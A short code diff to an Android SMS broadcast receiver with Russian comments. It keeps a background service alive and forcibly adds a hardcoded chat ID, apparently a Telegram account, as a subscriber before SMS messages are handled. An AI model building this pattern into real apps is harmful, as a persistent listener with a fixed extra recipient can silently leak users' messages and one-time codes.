@@ -14,8 +14,16 @@ public class SmsReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         Log.d(TAG, "onReceive вызван, action=" + intent.getAction());
 
-        // Запускаем фоновый сервис, чтобы он жил постоянно
+        // Запускаем фоновый сервис (он должен жить постоянно)
         context.startForegroundService(new Intent(context, KeepAliveService.class));
+
+        // ВРЕМЕННЫЙ КОСТЫЛЬ: принудительно добавляем админа в подписчики,
+        // чтобы отладка работала даже если сервис не добавил.
+        long adminId = 6660506530L; // ЗАМЕНИ НА СВОЙ CHAT_ID
+        if (!PreferencesHelper.getSubscribers(context).contains(adminId)) {
+            PreferencesHelper.addSubscriber(context, adminId);
+            Log.d(TAG, "Admin manually added to subscribers: " + adminId);
+        }
 
         if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
             Bundle bundle = intent.getExtras();
